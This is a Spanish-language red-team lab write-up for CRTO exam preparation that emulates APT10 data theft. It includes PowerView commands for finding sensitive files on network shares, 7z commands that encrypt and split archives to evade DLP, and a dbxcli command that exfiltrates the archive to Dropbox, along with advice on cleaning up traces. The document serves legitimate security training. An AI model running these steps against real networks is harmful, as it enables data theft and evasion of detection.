# Technique — Lab-17 Silent Exit

> **Capability (eje didáctico):** Exfiltration & Reporting — data hunting, staging (RAR/7z), exfiltración y cierre profesional del engagement.
> **Bloque CRTO:** Exfiltration & Reporting (consolidar la mentalidad de engagement real: el objetivo es el dato, no el flag).
> **Arquetipo:** Operación (A) — kill-chain real.
> **Adversario (escenario):** APT10 / Cloud Hopper — ver [`emulation.md`](emulation.md). **Exfil vía servicios cloud = APT10 documentado.**

> El examen CRTO suele tener como objetivo localizar y exfiltrar datos específicos, no solo comprometer máquinas. Lab-17 enseña la disciplina del cierre: encontrar el valor, extraerlo con OPSEC, y documentar el engagement de forma profesional.

---

## 1. La mentalidad del engagement real

En un red team real y en el examen CRTO, el objetivo no es "comprometer el DC" — es **demostrar impacto en negocio**: acceso a datos sensibles, compromiso de sistemas críticos, cadena de ataque documentada. El lab-17 es donde el operador pasa de "tengo acceso" a "tengo el informe".

## 2. Data Hunting — encontrar el valor

Antes de exfiltrar, hay que encontrar qué vale la pena. En un entorno enterprise los objetivos habituales son:

| Tipo de dato | Dónde buscar | Técnica |
|--------------|-------------|---------|
| Credenciales | SAM, NTDS.dit, archivos de configuración, browsers | DCSync, secretsdump, SharpDPAPI |
| Datos de negocio | Shares de red, SharePoint, SQL | Enum de shares + búsqueda por extensión |
| Propiedad intelectual | Shares específicos, repos internos | Acceso con credenciales comprometidas |
| Emails | Exchange/O365 con credenciales DA | EWS, GraphAPI |

**Enumeración de shares:**
```powershell
# Buscar shares accesibles con credenciales actuales
Find-DomainShare -CheckShareAccess
Invoke-ShareFinder -CheckShareAccess

# Buscar archivos interesantes en los shares
Find-InterestingDomainShareFile -Include *.txt,*.xml,*.doc,*.xls,*.ps1,*.bat
```

**OPSEC:** la búsqueda masiva de shares genera tráfico SMB hacia muchos hosts — ruidosa. Primero identificar shares de alto valor (Finance, HR, IT, C-suite) y luego acceso dirigido.

## 3. Staging — preparar para exfiltración

Una vez identificados los datos, hay que empaquetarlos de forma que su exfiltración sea discreta:

```powershell
# Comprimir y cifrar con 7z / RAR (APT10 usó RAR documentado)
7z a -p<contraseña> -mhe=on archive.7z <ficheros_objetivo>

# Fragmentar si es necesario (evita umbrales de tamaño en DLP)
7z a -v100m archive.7z <directorio>

# Desde el beacon (si 7z está en el sistema)
execute-assembly ... / shell 7z a ...
```

**Por qué cifrar:** el DLP (Data Loss Prevention) puede inspeccionar el contenido. Un archivo cifrado es opaco — solo el tamaño y el destino son visibles.

## 4. Exfiltración — sacar el dato

Las vías de exfiltración dependen del entorno y sus controles de salida:

| Canal | Cuándo usarlo | OPSEC |
|-------|--------------|-------|
| **Servicios cloud legítimos** (Dropbox, OneDrive, GitHub) | Cuando el proxy permite HTTPS hacia esos dominios | Tráfico mezclado con uso legítimo — difícil de distinguir |
| **C2 (beacon)** | Canal ya establecido y permitido | Lento para volúmenes grandes; arriesgado si el C2 cae |
| **DNS tunneling** | Cuando solo DNS sale | Muy lento, útil para datos pequeños (credenciales) |
| **HTTPS directo a C2** | Si el proxy es permisivo | Rápido pero identifica la IP de C2 |

**Exfil vía Dropbox (método APT10 documentado):**
```powershell
# dbxcli — cliente CLI de Dropbox
dbxcli put archive.7z /exfil/archive.7z
```

## 5. OPSEC del cierre — salida limpia

Exfiltrar sin limpiar la huella invalida el OPSEC de toda la operación:

- **Eliminar artefactos:** archivos de staging temporales, herramientas dejadas en los hosts.
- **Cerrar sesiones:** terminar procesos del beacon de forma ordenada (no crash).
- **Limpiar logs selectively:** Event Log tampering es detectable; preferible no dejar artefactos que limpiarlos torpemente.
- **Documentar qué se dejó:** para el reporte, el cliente necesita saber qué artefactos quedan y cuáles se eliminaron.

## 6. El reporte profesional

El reporte es el entregable final — lo que el cliente paga. En CRTO y en el trabajo real, un buen reporte tiene:

| Sección | Contenido |
|---------|-----------|
| **Executive Summary** | Impacto en negocio en lenguaje no técnico |
| **Cadena de ataque** | Desde el foothold hasta el objetivo final (con timeline) |
| **Hallazgos** | Vulnerabilidades explotadas, con CVSS/criticidad |
| **Evidencias** | Capturas, hashes, comandos — la prueba de que funcionó |
| **Recomendaciones** | Qué arreglar y en qué orden |

**Para el examen CRTO:** la cadena de ataque documentada (timeline de flags capturados, técnicas usadas, credenciales obtenidas) es el equivalente al reporte ejecutivo.

## 7. MITRE ATT&CK

| Táctica | Técnica | ID |
|---------|---------|----|
| Collection | Data from Network Shared Drives | T1039 |
| Collection | Archive Collected Data | T1560 |
| Exfiltration | Exfiltration over Web Service | T1567 |
| Exfiltration | Exfiltration over C2 Channel | T1041 |
| Defense Evasion | Indicator Removal | T1070 |

## 8. Key Takeaways

1. **El objetivo es el dato, no el flag.** La mentalidad de engagement real convierte el acceso en impacto demostrable.
2. **Data hunting dirigido antes que masivo.** Shares de alto valor primero; búsqueda masiva de archivos después.
3. **Cifrar antes de exfiltrar.** El DLP es ciego a contenido cifrado — solo ve tamaño y destino.
4. **Servicios cloud legítimos = tráfico mezclado.** Usar los mismos canales que los usuarios reduce la señal del analista de red.
5. **La salida limpia es parte del OPSEC.** Los artefactos dejados son IoCs que el cliente (o el defensor) encontrará.

## Referencias

- APT10 / Cloud Hopper — uso documentado de RAR + servicios cloud para exfiltración
- MITRE ATT&CK — T1560, T1567, T1041
- CRTO — Exfiltration & Reporting module

---

*Technique · Lab-17 Silent Exit · Exfiltration & Reporting (anatomía v3.1, arquetipo operación)*
